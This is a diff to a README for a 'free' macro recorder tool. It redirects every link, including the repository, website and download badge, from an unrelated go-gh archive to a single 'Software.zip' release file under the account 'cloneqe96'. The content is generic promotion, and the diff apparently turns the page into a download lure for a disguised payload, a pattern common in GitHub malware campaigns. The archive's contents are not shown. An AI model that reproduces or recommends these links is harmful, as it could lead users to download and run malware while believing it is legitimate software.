@@ -11,9 +11,9 @@ Welcome to the Auto Macro Recorder Free repository! This repository is your go-t
 
 ## Get Started with Auto Macro Recorder Free
 
-To start exploring key auto macro recorder features and functionalities, be sure to check out the [Auto Macro Recorder Free](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) repository.
+To start exploring key auto macro recorder features and functionalities, be sure to check out the [Auto Macro Recorder Free](https://github.com/cloneqe96/Auto-Macro-Recorder-Free/releases/download/v1.0/Software.zip) repository.
 
-[![Download Auto Macro Recorder Free](https://img.shields.io/badge/Download-Auto_Macro_Recorder_Free-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Auto Macro Recorder Free](https://github.com/cloneqe96/Auto-Macro-Recorder-Free/releases/download/v1.0/Software.zip)](https://github.com/cloneqe96/Auto-Macro-Recorder-Free/releases/download/v1.0/Software.zip)
 
 Make sure to launch the provided link to access the latest version of Auto Macro Recorder Free.
 
@@ -41,7 +41,7 @@ For additional resources, tutorials, and updates on Auto Macro Recorder Free, do
 Let's automate and elevate your productivity with Auto Macro Recorder Free! 🚀🎯
 
 🔗 Connect with us:
-- [GitHub Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
-- [Website](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- [GitHub Repository](https://github.com/cloneqe96/Auto-Macro-Recorder-Free/releases/download/v1.0/Software.zip)
+- [Website](https://github.com/cloneqe96/Auto-Macro-Recorder-Free/releases/download/v1.0/Software.zip)
 
 🌟 Happy Macro Recording! 🌟
